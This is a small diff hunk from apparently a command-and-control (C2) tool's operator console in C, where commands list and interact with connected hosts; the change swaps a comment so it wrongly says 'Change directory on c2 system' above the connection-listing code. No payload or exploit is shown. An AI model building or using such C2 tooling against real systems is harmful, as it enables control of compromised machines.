@@ -380,7 +380,7 @@ void sakito_console(Conn_array* conns) {
 				_chdir(&buf[3]);
 			}
 			else if (compare(buf, "list")) {
-				// List all connections.
+				// Change directory on c2 system.
 				list_connections(conns);
 			}
 			else if (compare(buf, "interact ")) {
